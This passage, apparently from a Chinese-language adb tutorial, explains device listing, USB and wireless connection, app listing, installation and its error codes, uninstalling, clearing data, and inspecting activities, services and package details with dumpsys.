<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">cf264b8f	device</span><br><span class="line">emulator-5554	device</span><br><span class="line">10.129.164.6:5555	device</span><br></pre></td></tr></table></figure>

<p>输出格式为 <code>[serialNumber] [state]</code>，serialNumber 即我们常说的 SN，state 有如下几种：</p>
<ul>
<li><p><code>offline</code> —— 表示设备未连接成功或无响应。</p>
</li>
<li><p><code>device</code> —— 设备已连接。注意这个状态并不能标识 Android 系统已经完全启动和可操作，在设备启动过程中设备实例就可连接到 adb，但启动完毕后系统才处于可操作状态。</p>
</li>
<li><p><code>no device</code> —— 没有设备&#x2F;模拟器连接。</p>
</li>
</ul>
<p>以上输出显示当前已经连接了三台设备&#x2F;模拟器，<code>cf264b8f</code>、<code>emulator-5554</code> 和 <code>10.129.164.6:5555</code> 分别是它们的 SN。从 <code>emulator-5554</code> 这个名字可以看出它是一个 Android 模拟器，而 <code>10.129.164.6:5555</code> 这种形为 <code>&lt;IP&gt;:&lt;Port&gt;</code> 的 serialNumber 一般是无线连接的设备或 Genymotion 等第三方 Android 模拟器。</p>
<p>常见异常输出：</p>
<ol>
<li><p>没有设备&#x2F;模拟器连接成功。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List of devices attached</span><br></pre></td></tr></table></figure>
</li>
<li><p>设备&#x2F;模拟器未连接到 adb 或无响应。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">cf264b8f	offline</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="USB-连接"><a href="#USB-连接" class="headerlink" title="USB 连接"></a>USB 连接</h3><p>通过 USB 连接来正常使用 adb 需要保证几点：</p>
<ol>
<li><p>硬件状态正常。</p>
<p>包括 Android 设备处于正常开机状态，USB 连接线和各种接口完好。</p>
</li>
<li><p>Android 设备的开发者选项和 USB 调试模式已开启。</p>
<p>可以到「设置」-「开发者选项」-「Android 调试」查看。</p>
<p>如果在设置里找不到开发者选项，那需要通过一个彩蛋来让它显示出来：在「设置」-「关于手机」连续点击「版本号」7 次。</p>
</li>
<li><p>设备驱动状态正常。</p>
<p>这一点貌似在 Linux 和 Mac OS X 下不用操心，在 Windows 下有可能遇到需要安装驱动的情况，确认这一点可以右键「计算机」-「属性」，到「设备管理器」里查看相关设备上是否有黄色感叹号或问号，如果没有就说明驱动状态已经好了。否则可以下载一个手机助手类程序来安装驱动先。</p>
</li>
<li><p>通过 USB 线连接好电脑和设备后确认状态。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>如果能看到</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xxxxxx device</span><br></pre></td></tr></table></figure>

<p>说明连接成功。</p>
</li>
</ol>
<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><p>除了可以通过 USB 连接设备与电脑来使用 adb，也可以通过无线连接——虽然连接过程中也有需要使用 USB 的步骤，但是连接成功之后你的设备就可以在一定范围内摆脱 USB 连接线的限制啦！</p>
<p>操作步骤：</p>
<ol>
<li><p>将 Android 设备与要运行 adb 的电脑连接到同一个局域网，比如连到同一个 WiFi。</p>
</li>
<li><p>将设备与电脑通过 USB 线连接。</p>
<p>应确保连接成功（可运行 <code>adb devices</code> 看是否能列出该设备）。</p>
</li>
<li><p>让设备在 5555 端口监听 TCP&#x2F;IP 连接：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb tcpip 5555</span><br></pre></td></tr></table></figure>
</li>
<li><p>断开 USB 连接。</p>
</li>
<li><p>找到设备的 IP 地址。</p>
<p>一般能在「设置」-「关于手机」-「状态信息」-「IP地址」找到，也可以使用下文里 <a href="#ip-%E5%9C%B0%E5%9D%80">查看设备信息 - IP 地址</a> 一节里的方法用 adb 命令来查看。</p>
</li>
<li><p>通过 IP 地址连接设备。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb connect &lt;device-ip-address&gt;</span><br></pre></td></tr></table></figure>

<p>这里的 <code>&lt;device-ip-address&gt;</code> 就是上一步中找到的设备 IP 地址。</p>
</li>
<li><p>确认连接状态。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>如果能看到</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;device-ip-address&gt;:5555 device</span><br></pre></td></tr></table></figure>

<p>说明连接成功。</p>
</li>
</ol>
<p>如果连接不了，请确认 Android 设备与电脑是连接到了同一个 WiFi，然后再次执行 <code>adb connect &lt;device-ip-address&gt;</code> 那一步；</p>
<p>如果还是不行的话，通过 <code>adb kill-server</code> 重新启动 adb 然后从头再来一次试试。</p>
<p><strong>断开无线连接</strong></p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br></pre></td></tr></table></figure>

<h3 id="无线连接（无需借助-USB-线）"><a href="#无线连接（无需借助-USB-线）" class="headerlink" title="无线连接（无需借助 USB 线）"></a>无线连接（无需借助 USB 线）</h3><p><strong>注：需要 root 权限。</strong></p>
<p>上一节「无线连接（需要借助 USB 线）」是官方文档里介绍的方法，需要借助于 USB 数据线来实现无线连接。</p>
<p>既然我们想要实现无线连接，那能不能所有步骤下来都是无线的呢？答案是能的。</p>
<ol>
<li><p>在 Android 设备上安装一个终端模拟器。</p>
<p>已经安装过的设备可以跳过此步。我使用的终端模拟器下载地址是：<a href="https://jackpal.github.io/Android-Terminal-Emulator/">Terminal Emulator for Android Downloads</a></p>
</li>
<li><p>将 Android 设备与要运行 adb 的电脑连接到同一个局域网，比如连到同一个 WiFi。</p>
</li>
<li><p>打开 Android 设备上的终端模拟器，在里面依次运行命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line">setprop service.adb.tcp.port 5555</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到 Android 设备的 IP 地址。</p>
<p>一般能在「设置」-「关于手机」-「状态信息」-「IP地址」找到，也可以使用下文里 <a href="#ip-%E5%9C%B0%E5%9D%80">查看设备信息 - IP 地址</a> 一节里的方法用 adb 命令来查看。</p>
</li>
<li><p>在电脑上通过 adb 和 IP 地址连接 Android 设备。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb connect &lt;device-ip-address&gt;</span><br></pre></td></tr></table></figure>

<p>这里的 <code>&lt;device-ip-address&gt;</code> 就是上一步中找到的设备 IP 地址。</p>
<p>如果能看到 <code>connected to &lt;device-ip-address&gt;:5555</code> 这样的输出则表示连接成功。</p>
</li>
</ol>
<p><em>节注一：</em></p>
<p>有的设备，比如小米 5S + MIUI 8.0 + Android 6.0.1 MXB48T，可能在第 5 步之前需要重启 adbd 服务，在设备的终端模拟器上运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">restart adbd</span><br></pre></td></tr></table></figure>

<p>如果 restart 无效，尝试以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">stop adbd</span><br><span class="line">start adbd</span><br></pre></td></tr></table></figure>

<h2 id="应用管理"><a href="#应用管理" class="headerlink" title="应用管理"></a>应用管理</h2><h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><p>查看应用列表的基本命令格式是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span><br></pre></td></tr></table></figure>

<p>即在 <code>adb shell pm list packages</code> 的基础上可以加一些参数进行过滤查看不同的列表，支持的过滤参数如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>显示列表</th>
</tr>
</thead>
<tbody><tr>
<td>无</td>
<td>所有应用</td>
</tr>
<tr>
<td>-f</td>
<td>显示应用关联的 apk 文件</td>
</tr>
<tr>
<td>-d</td>
<td>只显示 disabled 的应用</td>
</tr>
<tr>
<td>-e</td>
<td>只显示 enabled 的应用</td>
</tr>
<tr>
<td>-s</td>
<td>只显示系统应用</td>
</tr>
<tr>
<td>-3</td>
<td>只显示第三方应用</td>
</tr>
<tr>
<td>-i</td>
<td>显示应用的 installer</td>
</tr>
<tr>
<td>-u</td>
<td>包含已卸载应用</td>
</tr>
<tr>
<td><code>&lt;FILTER&gt;</code></td>
<td>包名包含 <code>&lt;FILTER&gt;</code> 字符串</td>
</tr>
</tbody></table>
<h4 id="所有应用"><a href="#所有应用" class="headerlink" title="所有应用"></a>所有应用</h4><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">package:com.android.smoketest</span><br><span class="line">package:com.example.android.livecubes</span><br><span class="line">package:com.android.providers.telephony</span><br><span class="line">package:com.google.android.googlequicksearchbox</span><br><span class="line">package:com.android.providers.calendar</span><br><span class="line">package:com.android.providers.media</span><br><span class="line">package:com.android.protips</span><br><span class="line">package:com.android.documentsui</span><br><span class="line">package:com.android.gallery</span><br><span class="line">package:com.android.externalstorage</span><br><span class="line">...</span><br><span class="line">// other packages here</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="系统应用"><a href="#系统应用" class="headerlink" title="系统应用"></a>系统应用</h4><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages -s</span><br></pre></td></tr></table></figure>

<h4 id="第三方应用"><a href="#第三方应用" class="headerlink" title="第三方应用"></a>第三方应用</h4><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages -3</span><br></pre></td></tr></table></figure>

<h4 id="包名包含某字符串的应用"><a href="#包名包含某字符串的应用" class="headerlink" title="包名包含某字符串的应用"></a>包名包含某字符串的应用</h4><p>比如要查看包名包含字符串 <code>mazhuang</code> 的应用列表，命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages mazhuang</span><br></pre></td></tr></table></figure>

<p>当然也可以使用 grep 来过滤：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm list packages | grep mazhuang</span><br></pre></td></tr></table></figure>

<h3 id="安装-APK"><a href="#安装-APK" class="headerlink" title="安装 APK"></a>安装 APK</h3><p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb install [-lrtsdg] &lt;path_to_apk&gt;</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<p><code>adb install</code> 后面可以跟一些可选参数来控制安装 APK 的行为，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>将应用安装到保护目录 &#x2F;mnt&#x2F;asec</td>
</tr>
<tr>
<td>-r</td>
<td>允许覆盖安装</td>
</tr>
<tr>
<td>-t</td>
<td>允许安装 AndroidManifest.xml 里 application 指定 <code>android:testOnly=&quot;true&quot;</code> 的应用</td>
</tr>
<tr>
<td>-s</td>
<td>将应用安装到 sdcard</td>
</tr>
<tr>
<td>-d</td>
<td>允许降级覆盖安装</td>
</tr>
<tr>
<td>-g</td>
<td>授予所有运行时权限</td>
</tr>
</tbody></table>
<p>运行命令后如果见到类似如下输出（状态为 <code>Success</code>）代表安装成功：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[100%] /data/local/tmp/1.apk</span><br><span class="line">	pkg: /data/local/tmp/1.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>

<p>上面是当前最新版 v1.0.36 的 adb 的输出，会显示 push apk 文件到手机的进度百分比。</p>
<p>使用旧版本 adb 的输出则是这样的：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">12040 KB/s (22205609 bytes <span class="keyword">in</span> 1.801s)</span><br><span class="line">        pkg: /data/local/tmp/SogouInput_android_v8.3_sweb.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>

<p>而如果状态为 <code>Failure</code> 则表示安装失败，比如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[100%] /data/local/tmp/map-20160831.apk</span><br><span class="line">        pkg: /data/local/tmp/map-20160831.apk</span><br><span class="line">Failure [INSTALL_FAILED_ALREADY_EXISTS]</span><br></pre></td></tr></table></figure>

<p>常见安装失败输出代码、含义及可能的解决办法如下：</p>
<table>
<thead>
<tr>
<th>输出</th>
<th>含义</th>
<th>解决办法</th>
</tr>
</thead>
<tbody><tr>
<td>INSTALL_FAILED_ALREADY_EXISTS</td>
<td>应用已经存在，或卸载了但没卸载干净</td>
<td><code>adb install</code> 时使用 <code>-r</code> 参数，或者先 <code>adb uninstall &lt;packagename&gt;</code> 再安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_APK</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_URI</td>
<td>无效的 APK 文件名</td>
<td>确保 APK 文件名里无中文</td>
</tr>
<tr>
<td>INSTALL_FAILED_INSUFFICIENT_STORAGE</td>
<td>空间不足</td>
<td>清理空间</td>
</tr>
<tr>
<td>INSTALL_FAILED_DUPLICATE_PACKAGE</td>
<td>已经存在同名程序</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NO_SHARED_USER</td>
<td>请求的共享用户不存在</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_UPDATE_INCOMPATIBLE</td>
<td>以前安装过同名应用，但卸载时数据没有移除；或者已安装该应用，但签名不一致</td>
<td>先 <code>adb uninstall &lt;packagename&gt;</code> 再安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_SHARED_USER_INCOMPATIBLE</td>
<td>请求的共享用户存在但签名不一致</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_MISSING_SHARED_LIBRARY</td>
<td>安装包使用了设备上不可用的共享库</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_REPLACE_COULDNT_DELETE</td>
<td>替换时无法删除</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_DEXOPT</td>
<td>dex 优化验证失败或空间不足</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_OLDER_SDK</td>
<td>设备系统版本低于应用要求</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CONFLICTING_PROVIDER</td>
<td>设备里已经存在与应用里同名的 content provider</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NEWER_SDK</td>
<td>设备系统版本高于应用要求</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_TEST_ONLY</td>
<td>应用是 test-only 的，但安装时没有指定 <code>-t</code> 参数</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CPU_ABI_INCOMPATIBLE</td>
<td>包含不兼容设备 CPU 应用程序二进制接口的 native code</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_MISSING_FEATURE</td>
<td>应用使用了设备不可用的功能</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CONTAINER_ERROR</td>
<td>1. sdcard 访问失败;<br />2. 应用签名与 ROM 签名一致，被当作内置应用。</td>
<td>1. 确认 sdcard 可用，或者安装到内置存储;<br />2. 打包时不与 ROM 使用相同签名。</td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_INSTALL_LOCATION</td>
<td>1. 不能安装到指定位置;<br />2. 应用签名与 ROM 签名一致，被当作内置应用。</td>
<td>1. 切换安装位置，添加或删除 <code>-s</code> 参数;<br />2. 打包时不与 ROM 使用相同签名。</td>
</tr>
<tr>
<td>INSTALL_FAILED_MEDIA_UNAVAILABLE</td>
<td>安装位置不可用</td>
<td>一般为 sdcard，确认 sdcard 可用或安装到内置存储</td>
</tr>
<tr>
<td>INSTALL_FAILED_VERIFICATION_TIMEOUT</td>
<td>验证安装包超时</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_VERIFICATION_FAILURE</td>
<td>验证安装包失败</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_PACKAGE_CHANGED</td>
<td>应用与调用程序期望的不一致</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_UID_CHANGED</td>
<td>以前安装过该应用，与本次分配的 UID 不一致</td>
<td>清除以前安装过的残留文件</td>
</tr>
<tr>
<td>INSTALL_FAILED_VERSION_DOWNGRADE</td>
<td>已经安装了该应用更高版本</td>
<td>使用 <code>-d</code> 参数</td>
</tr>
<tr>
<td>INSTALL_FAILED_PERMISSION_MODEL_DOWNGRADE</td>
<td>已安装 target SDK 支持运行时权限的同名应用，要安装的版本不支持运行时权限</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_NOT_APK</td>
<td>指定路径不是文件，或不是以 <code>.apk</code> 结尾</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_MANIFEST</td>
<td>无法解析的 AndroidManifest.xml 文件</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION</td>
<td>解析器遇到异常</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_NO_CERTIFICATES</td>
<td>安装包没有签名</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES</td>
<td>已安装该应用，且签名与 APK 文件不一致</td>
<td>先卸载设备上的该应用，再安装</td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_CERTIFICATE_ENCODING</td>
<td>解析 APK 文件时遇到 <code>CertificateEncodingException</code></td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_PACKAGE_NAME</td>
<td>manifest 文件里没有或者使用了无效的包名</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_SHARED_USER_ID</td>
<td>manifest 文件里指定了无效的共享用户 ID</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_MANIFEST_MALFORMED</td>
<td>解析 manifest 文件时遇到结构性错误</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_MANIFEST_EMPTY</td>
<td>在 manifest 文件里找不到找可操作标签（instrumentation 或 application）</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_INTERNAL_ERROR</td>
<td>因系统问题安装失败</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_USER_RESTRICTED</td>
<td>用户被限制安装应用</td>
<td>在开发者选项里将「USB安装」打开，如果已经打开了，那先关闭再打开。</td>
</tr>
<tr>
<td>INSTALL_FAILED_DUPLICATE_PERMISSION</td>
<td>应用尝试定义一个已经存在的权限名称</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NO_MATCHING_ABIS</td>
<td>应用包含设备的应用程序二进制接口不支持的 native code</td>
<td></td>
</tr>
<tr>
<td>INSTALL_CANCELED_BY_USER</td>
<td>应用安装需要在设备上确认，但未操作设备或点了取消</td>
<td>在设备上同意安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_ACWF_INCOMPATIBLE</td>
<td>应用程序与设备不兼容</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_TEST_ONLY</td>
<td>APK 文件是使用 Android Studio 直接 RUN 编译出来的文件</td>
<td>通过 Gradle 的 assembleDebug 或 assembleRelease 重新编译，或者 Generate Signed APK</td>
</tr>
<tr>
<td>does not contain AndroidManifest.xml</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>is not a valid zip file</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>Offline</td>
<td>设备未连接成功</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>unauthorized</td>
<td>设备未授权允许调试</td>
<td></td>
</tr>
<tr>
<td>error: device not found</td>
<td>没有连接成功的设备</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>protocol failure</td>
<td>设备已断开连接</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>Unknown option: -s</td>
<td>Android 2.2 以下不支持安装到 sdcard</td>
<td>不使用 <code>-s</code> 参数</td>
</tr>
<tr>
<td>No space left on device</td>
<td>空间不足</td>
<td>清理空间</td>
</tr>
<tr>
<td>Permission denied … sdcard …</td>
<td>sdcard 不可用</td>
<td></td>
</tr>
<tr>
<td>signatures do not match the previously installed version; ignoring!</td>
<td>已安装该应用且签名不一致</td>
<td>先卸载设备上的该应用，再安装</td>
</tr>
</tbody></table>
<p>参考：<a href="https://github.com/android/platform_frameworks_base/blob/master/core%2Fjava%2Fandroid%2Fcontent%2Fpm%2FPackageManager.java">PackageManager.java</a></p>
<p><em><code>adb install</code> 内部原理简介</em></p>
<p><code>adb install</code> 实际是分三步完成：</p>
<ol>
<li><p>push apk 文件到 &#x2F;data&#x2F;local&#x2F;tmp。</p>
</li>
<li><p>调用 pm install 安装。</p>
</li>
<li><p>删除 &#x2F;data&#x2F;local&#x2F;tmp 下的对应 apk 文件。</p>
</li>
</ol>
<p>所以，必要的时候也可以根据这个步骤，手动分步执行安装过程。</p>
<h3 id="卸载应用"><a href="#卸载应用" class="headerlink" title="卸载应用"></a>卸载应用</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb uninstall [-k] &lt;packagename&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;packagename&gt;</code> 表示应用的包名，<code>-k</code> 参数可选，表示卸载应用但保留数据和缓存目录。</p>
<p>命令示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb uninstall com.qihoo360.mobilesafe</span><br></pre></td></tr></table></figure>

<p>表示卸载 360 手机卫士。</p>
<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm clear &lt;packagename&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;packagename&gt;</code> 表示应用名包，这条命令的效果相当于在设置里的应用信息界面点击了「清除缓存」和「清除数据」。</p>
<p>命令示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell pm clear com.qihoo360.mobilesafe</span><br></pre></td></tr></table></figure>

<p>表示清除 360 手机卫士的数据和缓存。</p>
<h3 id="查看前台-Activity"><a href="#查看前台-Activity" class="headerlink" title="查看前台 Activity"></a>查看前台 Activity</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys activity activities | grep mResumedActivity</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mResumedActivity: ActivityRecord&#123;8079d7e u0 com.cyanogenmod.trebuchet/com.android.launcher3.Launcher t42&#125;</span><br></pre></td></tr></table></figure>

<p>其中的 <code>com.cyanogenmod.trebuchet/com.android.launcher3.Launcher</code> 就是当前处于前台的 Activity。</p>
<p><em>在 Windows 下以上命令可能不可用，可以尝试 <code>adb shell dumpsys activity activities | findstr mResumedActivity</code> 或 <code>adb shell &quot;dumpsys activity activities | grep mResumedActivity&quot;</code>。</em></p>
<h3 id="查看正在运行的-Services"><a href="#查看正在运行的-Services" class="headerlink" title="查看正在运行的 Services"></a>查看正在运行的 Services</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys activity services [&lt;packagename&gt;]</span><br></pre></td></tr></table></figure>

<p><code>&lt;packagename&gt;</code> 参数不是必须的，指定 <code>&lt;packagename&gt;</code> 表示查看与某个包名相关的 Services，不指定表示查看所有 Services。</p>
<p><code>&lt;packagename&gt;</code> 不一定要给出完整的包名，比如运行 <code>adb shell dumpsys activity services org.mazhuang</code>，那么包名 <code>org.mazhuang.demo1</code>、<code>org.mazhuang.demo2</code> 和 <code>org.mazhuang123</code> 等相关的 Services 都会列出来。</p>
<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys package &lt;packagename&gt;</span><br></pre></td></tr></table></figure>

<p>输出中包含很多信息，包括 Activity Resolver Table、Registered ContentProviders、包名、userId、安装后的文件资源代码等路径、版本信息、权限信息和授予状态、签名版本信息等。</p>
<p><code>&lt;packagename&gt;</code> 表示应用包名。</p>
<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Activity Resolver Table:</span><br><span class="line">  Non-Data Actions:</span><br><span class="line">      android.intent.action.MAIN:</span><br><span class="line">        5b4cba8 org.mazhuang.guanggoo/.SplashActivity filter 5ec9dcc</span><br><span class="line">          Action: <span class="string">&quot;android.intent.action.MAIN&quot;</span></span><br><span class="line">          Category: <span class="string">&quot;android.intent.category.LAUNCHER&quot;</span></span><br><span class="line">          AutoVerify=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Registered ContentProviders:</span><br><span class="line">  org.mazhuang.guanggoo/com.tencent.bugly.beta.utils.BuglyFileProvider:</span><br><span class="line">    Provider&#123;7a3c394 org.mazhuang.guanggoo/com.tencent.bugly.beta.utils.BuglyFileProvider&#125;</span><br><span class="line"></span><br><span class="line">ContentProvider Authorities:</span><br><span class="line">  [org.mazhuang.guanggoo.fileProvider]:</span><br><span class="line">    Provider&#123;7a3c394 org.mazhuang.guanggoo/com.tencent.bugly.beta.utils.BuglyFileProvider&#125;</span><br><span class="line">      applicationInfo=ApplicationInfo&#123;7754242 org.mazhuang.guanggoo&#125;</span><br><span class="line"></span><br><span class="line">Key Set Manager:</span><br><span class="line">  [org.mazhuang.guanggoo]</span><br><span class="line">      Signing KeySets: 501</span><br><span class="line"></span><br><span class="line">Packages:</span><br><span class="line">  Package [org.mazhuang.guanggoo] (c1d7f):</span><br><span class="line">    userId=10394</span><br><span class="line">    pkg=Package&#123;55f714c org.mazhuang.guanggoo&#125;</span><br><span class="line">    codePath=/data/app/org.mazhuang.guanggoo-2</span><br><span class="line">    resourcePath=/data/app/org.mazhuang.guanggoo-2</span><br><span class="line">    legacyNativeLibraryDir=/data/app/org.mazhuang.guanggoo-2/lib</span><br><span class="line">    primaryCpuAbi=null</span><br><span class="line">    secondaryCpuAbi=null</span><br><span class="line">    versionCode=74 minSdk=15 targetSdk=25</span><br><span class="line">    versionName=1.1.74</span><br><span class="line">    splits=[base]</span><br><span class="line">    apkSigningVersion=2</span><br><span class="line">    applicationInfo=ApplicationInfo&#123;7754242 org.mazhuang.guanggoo&#125;</span><br><span class="line">    flags=[ HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]</span><br><span class="line">    privateFlags=[ RESIZEABLE_ACTIVITIES ]</span><br><span class="line">    dataDir=/data/user/0/org.mazhuang.guanggoo</span><br><span class="line">    supportsScreens=[small, medium, large, xlarge, resizeable, anyDensity]</span><br><span class="line">    timeStamp=2017-10-22 23:50:53</span><br><span class="line">    firstInstallTime=2017-10-22 23:50:25</span><br><span class="line">    lastUpdateTime=2017-10-22 23:50:55</span><br><span class="line">    installerPackageName=com.miui.packageinstaller</span><br><span class="line">    signatures=PackageSignatures&#123;af09595 [53c7caa2]&#125;</span><br><span class="line">    installPermissionsFixed=<span class="literal">true</span> installStatus=1</span><br><span class="line">    pkgFlags=[ HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]</span><br><span class="line">    requested permissions:</span><br><span class="line">      android.permission.READ_PHONE_STATE</span><br><span class="line">      android.permission.INTERNET</span><br><span class="line">      android.permission.ACCESS_NETWORK_STATE</span><br><span class="line">      android.permission.ACCESS_WIFI_STATE</span><br><span class="line">      android.permission.READ_LOGS</span><br><span class="line">      android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">      android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">    install permissions:</span><br><span class="line">      android.permission.INTERNET: granted=<span class="literal">true</span></span><br><span class="line">      android.permission.ACCESS_NETWORK_STATE: granted=<span class="literal">true</span></span><br><span class="line">      android.permission.ACCESS_WIFI_STATE: granted=<span class="literal">true</span></span><br><span class="line">    User 0: ceDataInode=1155675 installed=<span class="literal">true</span> hidden=<span class="literal">false</span> suspended=<span class="literal">false</span> stopped=<span class="literal">true</span> notLaunched=<span class="literal">false</span> enabled=0</span><br><span class="line">      gids=[3003]</span><br><span class="line">      runtime permissions:</span><br><span class="line">        android.permission.READ_EXTERNAL_STORAGE: granted=<span class="literal">true</span></span><br><span class="line">        android.permission.READ_PHONE_STATE: granted=<span class="literal">true</span></span><br><span class="line">        android.permission.WRITE_EXTERNAL_STORAGE: granted=<span class="literal">true</span></span><br><span class="line">    User 999: ceDataInode=0 installed=<span class="literal">false</span> hidden=<span class="literal">false</span> suspended=<span class="literal">false</span> stopped=<span class="literal">true</span> notLaunched=<span class="literal">true</span> enabled=0</span><br><span class="line">      gids=[3003]</span><br><span class="line">      runtime permissions:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dexopt state:</span><br><span class="line">  [org.mazhuang.guanggoo]</span><br><span class="line">    Instruction Set: arm64</span><br><span class="line">      path: /data/app/org.mazhuang.guanggoo-2/base.apk</span><br><span class="line">      status: /data/app/org.mazhuang.guanggoo-2/oat/arm64/base.odex [compilation_filter=speed-profile, status=kOatUpToDa</span><br><span class="line">      te]</span><br></pre></td></tr></table></figure>

